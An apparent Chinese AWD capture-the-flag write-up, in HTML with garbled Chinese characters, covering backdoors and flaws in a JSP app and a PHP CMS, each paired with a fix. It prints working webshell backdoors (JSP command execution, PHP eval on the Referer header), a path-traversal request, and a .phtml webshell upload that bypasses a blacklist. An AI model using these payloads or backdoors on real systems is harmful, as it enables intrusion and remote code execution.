<p>ä¿®æ”¹åå°å¯†ç &#x2F;ä¿®æ”¹ä¸Šä¼ ä»£ç &#x2F;å¢åŠ waf</p>
<h2 id="æ¼æ´2-é»˜è®¤åé—¨"><a href="#æ¼æ´2-é»˜è®¤åé—¨" class="headerlink" title="æ¼æ´2-é»˜è®¤åé—¨"></a>æ¼æ´2-é»˜è®¤åé—¨</h2><p><code>\webapps\ROOT\forget.jsp</code>å­˜åœ¨åé—¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmdParameter</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd1&quot;</span>);<br>    <span class="hljs-keyword">if</span> (cmdParameter != <span class="hljs-literal">null</span> &amp;&amp; !cmdParameter.isEmpty()) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// æ„å»ºç³»ç»Ÿå‘½ä»¤</span><br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>();<br>            processBuilder.command(<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmdParameter);<br><br>            <span class="hljs-comment">// æ‰§è¡Œå‘½ä»¤å¹¶è·å–è¾“å‡º</span><br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> processBuilder.start();<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> process.getInputStream();<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream));<br>            String line;<br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>            <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                output.append(line).append(<span class="hljs-string">&quot;\n&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-comment">// è¾“å‡ºå‘½ä»¤æ‰§è¡Œç»“æœ</span><br>            out.println(<span class="hljs-string">&quot;Command executed successfully. Output:\n&quot;</span> + output.toString());<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            out.println(<span class="hljs-string">&quot;Error executing command: &quot;</span> + e.getMessage());<br>        &#125;<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>


<p><strong>æ”»å‡»ï¼š</strong></p>
<p>å¼€å±€å¾ˆå¿«éƒ½ä¿®å¤äº†ï¼Œæ‰‹åŠ¨äº¤äº†ä¸¤ä¸‰ä¸ª</p>
<p><strong>ä¿®å¤ï¼š</strong></p>
<p>æŠŠå¯†ç æ”¹äº†</p>
<h1 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h1><h2 id="æ¼æ´1-ä»»æ„æ–‡ä»¶è¯»å–"><a href="#æ¼æ´1-ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="æ¼æ´1-ä»»æ„æ–‡ä»¶è¯»å–"></a>æ¼æ´1-ä»»æ„æ–‡ä»¶è¯»å–</h2><p><code>\app\frontend\controller\Ajax.php</code> å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">root_path</span>().<span class="hljs-string">&#x27;public/storage/uploads/&#x27;</span>.<span class="hljs-variable">$file</span>;<br>    <span class="hljs-comment">// æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-variable">$result</span> = [<span class="hljs-string">&#x27;code&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;file not exists!&#x27;</span>)];<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>(<span class="hljs-variable">$result</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// è·å–æ–‡ä»¶å</span><br>    <span class="hljs-variable">$fileName</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br><br>    <span class="hljs-comment">// è®¾ç½®HTTPå“åº”å¤´</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&#x27;</span> . <span class="hljs-variable">$fileName</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$file</span>));<br><br>    <span class="hljs-comment">// è¯»å–æ–‡ä»¶å¹¶è¾“å‡ºç»™ç”¨æˆ·</span><br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);<br><br>    <span class="hljs-comment">// ç»ˆæ­¢è„šæœ¬ç»§ç»­æ‰§è¡Œ</span><br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<p><strong>æ”»å‡»ï¼š</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">/frontend/Ajax/getfile?file=../../../../../../flag<br></code></pre></td></tr></table></figure>

<p><img src="/img/awd/ccb-cms-1.png"></p>
<p><strong>ä¿®å¤ï¼š</strong></p>
<p>å¢åŠ è¿‡æ»¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">root_path</span>().<span class="hljs-string">&#x27;public/storage/uploads/&#x27;</span>.<span class="hljs-variable">$file</span>;<br>        <span class="hljs-comment">// æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span><br><br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;../&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$file</span>);<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$file</span>);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-variable">$result</span> = [<span class="hljs-string">&#x27;code&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;file not exists!&#x27;</span>)];<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>(<span class="hljs-variable">$result</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// è·å–æ–‡ä»¶å</span><br>        <span class="hljs-variable">$fileName</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br><br>        <span class="hljs-comment">// è®¾ç½®HTTPå“åº”å¤´</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&#x27;</span> . <span class="hljs-variable">$fileName</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$file</span>));<br><br>        <span class="hljs-comment">// è¯»å–æ–‡ä»¶å¹¶è¾“å‡ºç»™ç”¨æˆ·</span><br>        <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);<br><br>        <span class="hljs-comment">// ç»ˆæ­¢è„šæœ¬ç»§ç»­æ‰§è¡Œ</span><br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>

<h2 id="æ¼æ´2-é»˜è®¤åé—¨-1"><a href="#æ¼æ´2-é»˜è®¤åé—¨-1" class="headerlink" title="æ¼æ´2-é»˜è®¤åé—¨"></a>æ¼æ´2-é»˜è®¤åé—¨</h2><p><code>\app\api\controller\v1\Token.php</code>å­˜åœ¨ä»»æ„å‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">api</span>\<span class="hljs-title class_">controller</span>\<span class="hljs-title class_">v1</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">fun</span>\<span class="hljs-title">auth</span>\<span class="hljs-title">Api</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">App</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Request</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Config</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * ç”Ÿæˆtoken</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Token</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Api</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$noAuth</span> = [<span class="hljs-string">&#x27;*&#x27;</span>];<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">App <span class="hljs-variable">$app</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">__construct</span>(<span class="hljs-variable">$app</span>);<br>        <span class="hljs-comment">//è·¨åŸŸ</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Origin:*&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Headers:Accept,Referer,Host,Keep-Alive,User-Agent,X-Requested-With,Cache-Control,Content-Type,Cookie,token&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Credentials:true&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Methods:GET, POST, PATCH, PUT, DELETE,OPTIONS&#x27;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">build</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-string">&#x27;\\fun\\auth\\&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$this</span>-&gt;type).<span class="hljs-string">&#x27;Token&#x27;</span>);<br>        <span class="hljs-variable">$token</span> = <span class="hljs-variable">$class</span>::<span class="hljs-title function_ invoke__">instance</span>();<br>        <span class="hljs-variable">$token</span>-&gt;<span class="hljs-title function_ invoke__">build</span>();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">refresh</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-string">&#x27;\\fun\\auth\\&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$this</span>-&gt;type).<span class="hljs-string">&#x27;Token&#x27;</span>);<br>        <span class="hljs-variable">$token</span> = <span class="hljs-variable">$class</span>::<span class="hljs-title function_ invoke__">instance</span>();<br>        <span class="hljs-variable">$token</span>-&gt;<span class="hljs-title function_ invoke__">refresh</span>();<br><br>    &#125;<br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">getallheaders</span>()[<span class="hljs-string">&#x27;Referer&#x27;</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>æ”»å‡»ï¼š</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">GET <span class="hljs-regexp">/api/</span>v1.token<span class="hljs-regexp">/test HTTP/</span><span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">8.147</span>.<span class="hljs-number">134.118</span>:<span class="hljs-number">24631</span><br>Referer:system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br><br><br></code></pre></td></tr></table></figure>


<p><strong>ä¿®å¤ï¼š</strong></p>
<p>æ·»åŠ æ³¨é‡Š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">//@eval(getallheaders()[&#x27;Referer&#x27;]);</span><br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="æ¼æ´3-æ–‡ä»¶ä¸Šä¼ getshell"><a href="#æ¼æ´3-æ–‡ä»¶ä¸Šä¼ getshell" class="headerlink" title="æ¼æ´3-æ–‡ä»¶ä¸Šä¼ getshell"></a>æ¼æ´3-æ–‡ä»¶ä¸Šä¼ getshell</h2><p><del>è²Œä¼¼è¿˜æœ‰ä¸ªä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œæ¯”èµ›çš„æ—¶å€™æ²¡æ—¶é—´çœ‹äº†</del></p>
<p><strong>èµ›åå¤ç°</strong></p>
<p>æ³¨å†Œåçš„åŸºæœ¬è®¾ç½®æœ‰ä¸Šä¼ å¤´åƒçš„åœ°æ–¹</p>
<p><img src="/img/awd/ccb-cms-2.png"></p>
<p>å®šä½ä»£ç </p>
<p>&#x2F;app&#x2F;common&#x2F;service&#x2F;UploadService.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> $file</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> bool</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment"> * æ£€æµ‹æ–‡ä»¶æ˜¯å¦ç¬¦åˆè¦æ±‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//ç¦æ­¢ä¸Šä¼ PHPå’ŒHTML.sshç­‰è„šæœ¬æ–‡ä»¶</span><br>    <span class="hljs-keyword">if</span> (<br><span class="hljs-comment">//           in_array($this-&gt;file-&gt;getMime(),</span><br><span class="hljs-comment">//               [&#x27;application/octet-stream&#x27;, &#x27;text/html&#x27;,&#x27;application/x-javascript&#x27;,&#x27;text/x-php&#x27;,&#x27;aplication/x-msdownload&#x27;,&#x27;application/java-archive&#x27;])</span><br><span class="hljs-comment">//           ||</span><br>    <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">extension</span>(),<br>        [<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-string">&#x27;htm&#x27;</span>,<span class="hljs-string">&#x27;xml&#x27;</span>,<span class="hljs-string">&#x27;ssh&#x27;</span>,<span class="hljs-string">&#x27;bat&#x27;</span>,<span class="hljs-string">&#x27;jar&#x27;</span>,<span class="hljs-string">&#x27;java&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;File format is limited&#x27;</span>));<br>    &#125;<br>    <span class="hljs-comment">//æ–‡ä»¶å¤§å°é™åˆ¶</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">getSize</span>() &gt; <span class="hljs-variable language_">$this</span>-&gt;fileMaxsize*<span class="hljs-number">1024</span>)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;File size is limited&#x27;</span>));<br>    &#125;<br>    <span class="hljs-comment">//æ–‡ä»¶ç±»å‹é™åˆ¶</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;fileExt !=<span class="hljs-string">&#x27;*&#x27;</span> &amp;&amp; !<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">extension</span>(),<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;fileExt)))&#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;File type is limited&#x27;</span>));<br>    &#125;<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-variable language_">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">extension</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">getMime</span>(), [<span class="hljs-string">&#x27;image/gif&#x27;</span>, <span class="hljs-string">&#x27;image/jpg&#x27;</span>, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>, <span class="hljs-string">&#x27;image/bmp&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>, <span class="hljs-string">&#x27;image/webp&#x27;</span>]) || <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, [<span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, <span class="hljs-string">&#x27;bmp&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;webp&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$imgInfo</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">getPathname</span>());<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$imgInfo</span> || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$imgInfo</span>[<span class="hljs-number">0</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$imgInfo</span>[<span class="hljs-number">1</span>])) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;Uploaded file is not a valid image&#x27;</span>));<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;width = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$imgInfo</span>[<span class="hljs-number">0</span>]) ? <span class="hljs-variable">$imgInfo</span>[<span class="hljs-number">0</span>] : <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;height = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$imgInfo</span>[<span class="hljs-number">1</span>]) ? <span class="hljs-variable">$imgInfo</span>[<span class="hljs-number">1</span>] : <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>é™åˆ¶äº†éƒ¨åˆ†åç¼€ï¼Œç”¨<code>phtml</code>ç»•è¿‡</p>
<p><img src="/img/awd/ccb-cms-3.png"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">POSTæœªæˆæƒä¸Šä¼ ï¼Œä¸éœ€è¦ç™»å½•<br><br>POST <span class="hljs-regexp">/frontend/</span>ajax<span class="hljs-regexp">/uploads HTTP/</span><span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">100.129</span><br>Content-Length: <span class="hljs-number">206</span><br>Accept: application<span class="hljs-regexp">/json, text/</span>javascript, */*; q=<span class="hljs-number">0.01</span><br>X-Requested-With: XMLHttpRequest<br>User-Agent: Mozilla<span class="hljs-regexp">/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/</span><span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-regexp">/124.0.0.0 Safari/</span><span class="hljs-number">537.36</span><br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDbISZWkAvBPdc8u0<br>Origin: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">100.129</span><br>Referer: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">100.129</span><span class="hljs-regexp">/frontend/m</span>ember/set.html<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span>,en;q=<span class="hljs-number">0.8</span><br>Connection: close<br><br>------WebKitFormBoundaryDbISZWkAvBPdc8u0<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;1.phtml&quot;</span><br>Content-Type: image/jpeg<br><br>&lt;?php<br>eval(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>------WebKitFormBoundaryDbISZWkAvBPdc8u0--<br><br></code></pre></td></tr></table></figure>


<p><strong>ä¿®å¤</strong></p>
<p>ä¾¿æ·çš„ï¼šå¢åŠ å¯¹phtmlçš„è¿‡æ»¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">extension</span>(),<br>            [<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-string">&#x27;htm&#x27;</span>,<span class="hljs-string">&#x27;xml&#x27;</span>,<span class="hljs-string">&#x27;ssh&#x27;</span>,<span class="hljs-string">&#x27;bat&#x27;</span>,<span class="hljs-string">&#x27;jar&#x27;</span>,<span class="hljs-string">&#x27;java&#x27;</span>,<span class="hljs-string">&#x27;phtml&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;File format is limited&#x27;</span>));<br>        &#125;<br></code></pre></td></tr></table></figure>

<p>æˆ–è€…ç¨å¾®éº»çƒ¦ä¸€ç‚¹çš„ï¼Œå¢åŠ ä¸€ä¸ªç™½åå•</p>
<p>&#x2F;app&#x2F;frontend&#x2F;controller&#x2F;Ajax.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> \think\response\Json</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> \think\db\exception\DataNotFoundException</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> \think\db\exception\DbException</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> \think\db\exception\ModelNotFoundException</span><br><span class="hljs-comment"> * æ–‡ä»¶ä¸Šä¼ æ€»å…¥å£ é›†æˆqiniu ali tenxunoss</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uploads</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br><br>        <span class="hljs-variable">$list</span> = [<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>];<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-string">&#x27;file&#x27;</span>);<br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">getOriginalName</span>(), PATHINFO_EXTENSION));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$list</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;NO&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$upload</span> = <span class="hljs-title class_">UploadService</span>::<span class="hljs-title function_ invoke__">instance</span>();<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$upload</span>-&gt;<span class="hljs-title function_ invoke__">uploads</span>(<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&#x27;member.id&#x27;</span>),<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>(<span class="hljs-variable">$result</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>


<h2 id="æ¼æ´4-åå°æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶åŒ…å«RCE"><a href="#æ¼æ´4-åå°æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶åŒ…å«RCE" class="headerlink" title="æ¼æ´4-åå°æ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åŒ…å«RCE"></a>æ¼æ´4-åå°æ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åŒ…å«RCE</h2><p><strong>èµ›åå¤ç°</strong></p>
<p>F12 æ³„éœ²è´¦å·å¯†ç </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>    layui.<span class="hljs-title function_">use</span>([<span class="hljs-string">&#x27;layer&#x27;</span>, <span class="hljs-string">&#x27;jquery&#x27;</span>], <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> $ = layui.<span class="hljs-property">jquery</span>,<br>            layer = layui.<span class="hljs-property">layer</span>;<br>        $(<span class="hljs-string">&#x27;.layui-tips&#x27;</span>).<span class="hljs-title function_">hover</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>            layer.<span class="hljs-title function_">tips</span>(<span class="hljs-string">&#x27;è´¦å·admin,å¯†ç 123456&#x27;</span>);<br>        &#125;)<br>    &#125;)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p>è®¿é—®<code>/backend</code>ç™»å½•åå°</p>
<p>å‘ç°æœ‰ä¸€ä¸ªç¦»çº¿å®‰è£…æ’ä»¶çš„åŠŸèƒ½</p>
<p>å®¡è®¡ä»£ç </p>
<p>&#x2F;app&#x2F;backend&#x2F;controller&#x2F;Addon.php</p>
